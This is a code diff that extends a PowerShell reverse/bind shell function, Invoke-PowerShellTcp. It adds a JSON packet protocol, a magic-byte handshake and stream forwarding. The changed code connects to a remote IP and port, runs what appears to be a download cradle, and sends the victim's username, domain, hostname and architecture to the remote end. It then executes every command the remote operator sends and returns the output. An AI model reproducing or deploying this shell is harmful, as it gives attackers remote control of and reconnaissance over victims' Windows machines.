@@ -26,11 +26,81 @@ function Invoke-PowerShellTcp
         $Bind
 
     )
+    function Read-ShellPacket {
+        param (
+            [Parameter(Position = 0)] $Stream
+        )
+        $stream.Read($bytes, 0, 2)
+        $packet_type = $bytes
+        $stream.Read($bytes, 0, 4)
+        $packet_length = $bytes
+        if ([BitConverter]::IsLittleEndian) {
+            [Array]::reverse($packet_length)
+        }
+        $len = [BitConverter]::ToInt32($packet_length)
+        $stream.Read($bytes, 0, $len)
+        $body = $bytes
+        $body = ([text.encoding]::ASCII).GetBytes($body)
+        $body | ConvertFrom-JSON
+    }
+
+    function Write-ShellPacket {
+        param (
+            [Parameter(Position = 0)] $Packet,
+            [Parameter(Position = 1)] $Stream
+        )
+        $body = ($Packet | ConvertTo-JSON)
+        $body = ([text.encoding]::ASCII).GetBytes($body)
+        $packet_length = [BitConverter]::GetBytes($body.length)
+        if ([BitConverter]::IsLittleEndian) {
+            [Array]::reverse($packet_length)
+        }
+        $packet_type = [byte[]](0x0,0x0)
+        $Stream.Write($packet_type + $packet_length + $body, 0, 6 + $body.length)
+        $Stream.Flush()
+    }
+
+    function Get-ShellHello {
+        @{
+            "msg_type" = "SHELL_HELLO"
+            "data" = @{
+                "user" = "$ENV:USERNAME"
+                "domain" = "$ENV:USERDOMAIN"
+                "hostname" = "$ENV:COMPUTERNAME"
+                "arch" = "$ENV:PROCESSOR_ARCHITECTURE"
+                "ps_version" = [String]$PSVersionTable.PSVersion
+                "os_version" = [String]$PSVersionTable.BuildVersion
+            }
+        }
+    }
+    function Get-ShellPrompt {
+        @{
+            "msg_type" = "PROMPT"
+            "data" = 'PS ' + (Get-Location).Path + '> '
+        }
+    }
+
+    function Get-OutputStreams {
+        param (
+            [Parameter(Position = 0)] $Streams
+        )
+        $result = @()
+        $error | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_ }) }
+        $error.clear()
+        $Streams.Error | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_.MessageData.Message }) }
+        $Streams.Warning | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.MessageData.Message }) }
+        $Streams.Verbose | % { $result+=(@{ "msg_type" = "STREAM_VERBOSE"; "data" = $_.MessageData.Message }) }
+        $Streams.Debug | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.MessageData.Message }) }
+        $Streams.Progress | % { $result+=(@{ "msg_type" = "STREAM_PROGRESS"; "data" = $_.MessageData.Message }) }
+        $Streams.Information | % { $result+=(@{ "msg_type" = "STREAM_INFORMATION"; "data" = $_.MessageData.Message }) }
+        $result
+    }
 
     #Connect back if the reverse switch is used.
     if ($Reverse)
     {
         $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        if (-not $client) { Return }
     }
 
     #Bind to the provided port if Bind switch is used.
@@ -41,65 +111,43 @@ function Invoke-PowerShellTcp
         $client = $listener.AcceptTcpClient()
     }
 
-    function Error_DataAdded {
-        Param(
-            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
-            [Object]$Sender,
-            [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
-            [System.Management.Automation.DataAddedEventArgs]$e
-        )
-        write-error $e
-    }
-
+    $error.clear()
     $stream = $client.GetStream()
-    [byte[]]$bytes = 0..255|%{0}
+    $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
+    [byte[]]$bytes = 0..1024|%{0}
 
     #Create PowerShell object
     $PowerShell = [powershell]::Create()
-    # $Object = New-Object 'System.Management.Automation.PSDataCollection[psobject]'
-    $outputStream = New-Object -Typename  System.Management.Automation.PSDataCollection[PSObject]
-
-    # $outputStream = $PowerShell.Streams.Error
-    $outputStream.DataAdded += { Error_DataAdded }
-
     [void]$PowerShell.AddScript($DL_CRADLE)
 
-    #Specfiy the required flags to pull the output stream
+    Write-ShellPacket (Get-ShellHello) $stream
+
     $init = ( $PowerShell.Invoke() | Out-String )
     # https://stackoverflow.com/questions/27254198/why-cant-i-write-error-from-powershell-streams-error-add-dataadded
     # https://stackoverflow.com/questions/54107825/how-to-pass-warning-and-verbose-streams-from-a-remote-command-when-calling-power
 
-    #Send back current username and computername
-    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n`n" + $init)
-    $stream.Write($sendbytes,0,$sendbytes.Length)
+    Get-OutputStreams $PowerShell.Streams | % { Write-ShellPacket $_ $stream }
 
-    #Show an interactive PowerShell prompt
-    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
-    $stream.Write($sendbytes,0,$sendbytes.Length)
+    Write-ShellPacket (Get-ShellPrompt) $stream
 
-    $error.clear()
+    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+    $data = ""
     while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
     {
-        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
         $data = $EncodedText.GetString($bytes,0, $i)
 
         #Execute the command on the target.
         [void]$PowerShell.AddScript($data)
-        $sendback = ( $PowerShell.Invoke() | Out-String )
+        $output = ( $PowerShell.Invoke() )
 
+        Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = $output } $stream
 
-        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
-        $x = ($error[0] | Out-String)
-        $error.clear()
-        $sendback2 = $sendback2 + $x
+        Get-OutputStreams | % { Write-ShellPacket $_ $stream }
 
-        #Return the results
-        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-        $stream.Write($sendbyte,0,$sendbyte.Length)
-        $stream.Flush()
+        Write-ShellPacket (Get-ShellPrompt) $stream
     }
-    $client.Close()
-    $listener.Stop()
+    if ($client) { $client.Close() }
+    if ($listener) {$listener.Stop()}
 }
 
 
